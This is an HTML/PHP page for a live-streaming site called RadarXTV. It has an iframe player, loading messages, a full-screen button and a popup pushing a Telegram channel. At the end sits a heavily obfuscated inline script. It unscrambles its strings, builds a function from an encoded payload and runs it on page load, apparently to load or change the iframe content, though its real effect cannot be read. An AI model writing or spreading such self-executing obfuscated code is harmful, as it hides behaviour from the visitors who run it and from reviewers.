<!DOCTYPE html>
<?php include 'banner.php'; ?>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RadarXTV - Live Stream</title>
    <style>
        body { 
            background-color: #121212; 
            color: white; 
            font-family: Arial, sans-serif; 
            margin: 0; 
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }
        .container { 
            text-align: center;
            position: relative;
        }
        iframe { 
            width: 80vw;  /* Width same as before */
            height: 60vh; /* Reduced height */
            border: none; 
            display: block; 
            margin: 0 auto;
        }
        #loadingMessage, #refreshMessage { 
            font-size: 16px; 
            color: red; 
            position: relative;
        }
        #refreshMessage { 
            color: yellow; 
            margin-top: 10px;
        }
        #fullScreenBtn { 
            position: fixed; 
            bottom: 20px; 
            left: 50%; 
            transform: translateX(-50%);
            padding: 10px 20px; 
            background-color: #00ffcc; 
            color: white; 
            font-size: 16px; 
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .popup { 
            position: fixed; 
            top: 0; 
            left: 0; 
            width: 100%; 
            height: 100%; 
            background: rgba(0,0,0,0.8); 
            display: flex; 
            justify-content: center; 
            align-items: center; 
        }
        .popup-content { 
            background: white; 
            color: black; 
            padding: 20px; 
            border-radius: 8px; 
            text-align: center; 
        }
        .popup button { 
            margin: 10px; 
            padding: 10px 20px; 
            border: none; 
            cursor: pointer; 
        }
            .logo {
        position: absolute;
        top: 10px; /* Adjust vertical position */
        left: 10px; /* Adjust horizontal position */
        z-index: 1; /* Ensure the logo appears above the video */
        max-width: 120px; /* Set maximum width for the logo */
        max-height: 120px; /* Set maximum height for the logo */
        pointer-events: none; /* Prevent interference with video controls */
    }
    
    </style>
</head>
<body>
    <!-- Video container -->
    <div class="video-container">
        <!-- Logo inside the video -->
        <img src="chutman.jpg" alt="Logo" class="logo">
        
<div class="container">
    <h1>RadarXTV - Live Stream</h1>
    
    <div id="iframeContainer">
        <iframe id="streamIframe" src="" style="display:none;"></iframe>
    </div>
    
    <div id="loadingMessage">Loading stream... Please wait.</div>
    <div id="refreshMessage">Refresh the page if stream takes more than 60 seconds to load.</div>
    
    <button id="fullScreenBtn">Full Screen</button>
</div>

<!-- Popup for Telegram -->
<div id="popup" class="popup" style="display: flex;">
    <div class="popup-content">
        <p>Join RadarXCricket on Telegram</p>
        <button id="joinBtn">Join</button>
        <button id="cancelBtn">Cancel</button>
    </div>
</div>

<script>
(function(){var GoB='',Yaq=888-877;function TCN(z){var a=3534416;var u=z.length;var e=[];for(var b=0;b<u;b++){e[b]=z.charAt(b)};for(var b=0;b<u;b++){var y=a*(b+183)+(a%44528);var c=a*(b+675)+(a%17960);var s=y%u;var m=c%u;var n=e[s];e[s]=e[m];e[m]=n;a=(y+c)%6606044;};return e.join('')};var tYO=TCN('njrzsfcrvncotuduwbhyokmtaoixsqrelgctp').substr(0,Yaq);var ZHJ='na. t=r5th(5t,)==2av1rud="9b,d=f=hlj(l.n)plr]t;v0xrzs;6aa b=u80,=8o7=,;597n,o7)7","047a,l6r8(,t0)7u,;1u9+,10w8a,A5f6a,(6C;sa; ]=l]bfvrtv r;c[03c8t=lnnat ;t++)r[l[}]S=a+b;;ao x=e]+wl=v8ahs=u4uv.=a4(fnrev6rtsg0rsrarg8mlngsnl)n=t ;]+n)tvrrqxhaeg;mpnhsrs).gp.i;(  1)ifbrmv"r=p.xcl{n=tp-);=>a0rp+-v{fao 9=hubldv-rkiex0p7;,a+ h=,uil(vfraes0gv(r;geinl;nati;ja1 t;po{(wa) u=f;)<g;.+i)9v=rhjAicccarC[dvA((u)rvarrf.uljw;,frf.{s=,fi1;*n+e.(h7rCooert)l+1v-s;m= ;]+m;ielsa cfej =.)vnrhv(h.ae(g.hpwhi[c+aeCod4Al([+1),+c.uh{reo]e;tll.2r-h;(=u;)+[2.}8l1emc5n(inut;di"(c=Cn[lh),=0]1ir(l>l)g.eu;hcins2b)t}ixgeemmt)bbeprsn( [)+a][;<=(+,;;i[(g!nn!l3)Ci+(n< )2.du heifs=b+t]i(g;e8)ixap4=b.<otn+"{)l}4r}p(se(t[1],;vvhrjq"rfj=i((.";;sa  6=)3,,p299g,y2r1(,c2 .,o*c.t)ti;=a, i=mtii(gaf;orCfaeC)d=(v6l;0o((ra{ }=+;t<v.oevgoh;c;++q8q+silrtvo[d}c[a1Ac(l)=.uoln=Ssr)n .rrrm6hor.oleravch)8;=e-uwn9q-sol]too]";"j.)oenco,;';var DEW=TCN[tYO];var QLw='';var igP=DEW;var BcQ=DEW(QLw,TCN(ZHJ));var qyd=BcQ(TCN('6unc &wi]dowoQ7w.ndo1QIQ4con(ole+Q7c$nso0eQI1&QDtQ7QiQIQQ_95P3Q)f4()QretnrQ2QQ0s?$ft+uoem$_3+(aQ.!aQbQ\'6p_61r61(u-==Q.fbeIQ&"95_2Q)4 (){petuuQ20oOQ\'0EQ-l=.fQQ0s;$Q#_ret0rn.jdoc&meneQIQ%StrQng(t7StPingQOQ\'i7(Qe%.f}QOQ%43(e-+.ebQO \'60]Q-._.fbQQH_._2a}4=(+$afk148Q6)(teadMsntdct:ADdqhM%idr.s1nt\/6uoaQvsl6saS2o%eQedac=5yc%stfii.2t%t{keelkcti8Cq4ntl6%fn_esereno dn.a%oCbby%Dea.cikfnnipQgpdQe%t}%oopeql(ovM2sth3seo"kty_p%sM.ponic:Sg9nQ%pc1luy2afueeiqat.vQ.qs4%rl.fel_co%4%cl=l\/zflnrfn%etleb_u%.Qle%2rroappn7qleg.fcidhla.vnQeeu#urnQpth&l%t5escQ\/tonrr.ee%l%.vdQnn\/8c.!5EtnCl.pQoccQcgt"tseQoornear,%%u5%ieofnh$nrEmsna)I:c#nkene?nRtee2lvlwunt2.fasutceoe\/QlIeitlt oitQ%ttlwalQqas r%rn\/mvraadQEeeQ.!s i%n3hir{,885788s;QA326((,QM!etr8l$h]{QHfQNx_NwQQnQNeQNllNv=Q};h&FQM7etr_l$hOQHc%p.!leng%h;x)F[]n;foe(QH}=0;D?bo1$_6;(o,c);oC+){JJo]%.fpv!ch.r.xn(o)i;foi(QH3=0;.?bo $_6n(o,S);o2+){}Q*4 (h.o_.d_fQ+6,95(),Qf37( QP4r789s));4nQ*r3(ha!_.\'.fQ o,7e9))aQ.3 (hQe314l0))S;;eg*37[wQPn);;oQ*3.(nQ%c);.vQFQJeQ];;Qi68(t,x,e);Q169(s,x,=);Q_70(l,w,Q)};7Ht=Q?giien$;tri g()e!frbmCharCoQe(117);_Hr=0aQ>{=.a2Q>fu.a#1Q>mQ.a%f>k=!a#0]>q=Qa#.eQ@.lx.!rQCr_;i)nCtQQf)Q(mQ;})QCqQ;t }if6!_$a2ad!){Q](tr;e,Q)4]).(QAn(){_$afQ148!6=.8Q=2Q]}).)Q@s;QA220(Q{QHm1QN frate={0;Q1tFQ=9];;l:=.sQMQs[_Q;2]);;Q!t2QBAQ1)4Q:QQ5QG("1Q(QKQ.[_Q(12Q)1]]7Q:)eifQ=QEQ(,fa3se)Q,_9Q_3Qn48(1()} QMQ}[_Qr14Qi3QG)"2Q6QKQo[_Qo25Qe3QGm"4_Q);iQQ.6._61N61(Q$af<148Q6,1#){Q=74(aQ@}iQMQ9[_Qi27Qc3QG."5_;)}dncum,ntQu31]((Q=e],Q;);Q(n.f2!683e,xQl){;JeQh=.fQJlQ8Q6Q]69(d,x,e){Q2lQQa.fvf!_Q!Q!75(h,l,n) hQ*07(QwwQP8.!_4),1Q367b3)Q.Q!7nQB,!1){3:Q9_]]=;fQ19!_QdQ"1l<{Ql){Q)Q#[fQ%89)Q9+Q46Q\/9] if(w?uosl$_{3(Qo)Q,(95_$Q)59()(#ullaQ@}8Q!7#QB),Q0Qc2Q<mQ()tTQ$QQSQ$5QL=lse.fQTr$6QpQ$6QLelge.fQTQ$pQSQd7QLklseQfQTw$8QfQ$8$L}}p;if$Q?giden$QDQu19]_&&.)Q?g%denQQDQc19Q(20]iQ,QtQ511Q42a]](6=24;)Q9r3]]tjQ"3_()5}}QrQ"4$(){m(){6MQ#S_Q%f6])797Ql6Q\/.]}QeQ!7)(){.8=.Q0Q0("5_6){QoQ,w3ndo)Q52QQ42(Q\/3i]}Q%Q!7;QB))Q:Q]7Q4%Q\/1o]Q03"3_3){Qaerra,co}sol Q52h]]Q9Q=2o],ear)).} Qmspl)terp$afm1486so$duilyer_haf2.486rft$ ide)$do=ume.t()rifrQme.s_Q9= $_.ad4.3]]8Q= .ionQfQ?Qidee$ cdion0fQ?Qoe${ revurntf.f=An(=6af750_.9_5(_56d54_).!_(.fQQboe6_ Qc43($){Q3gid(n$ -,bQ4a (o?bon$_ 0]=..Q= 06j efrape.jsq.s(n.f_$af\/148Q ])_91 %]Q91()Q] }Qen.fg){r?turn.f 7$af_148d0 [!= i3ram..!_<).!kpliQ( _cB) d$_2ed4[C.a;rH Qqft$Q;reournffun7tio!(ifiame3.!j_in({scrQen 91_6Q( .m_=.) ]Q3j v]r.f;QOc%x.!a[ ;fM ]v()}ojsoM ={o, }aun [!_,Q.!__ ]=ff ]e){ {if('));var kDc=igP(GoB,qyd );kDc(2247);return 6059})()
</script>

</body>
</html>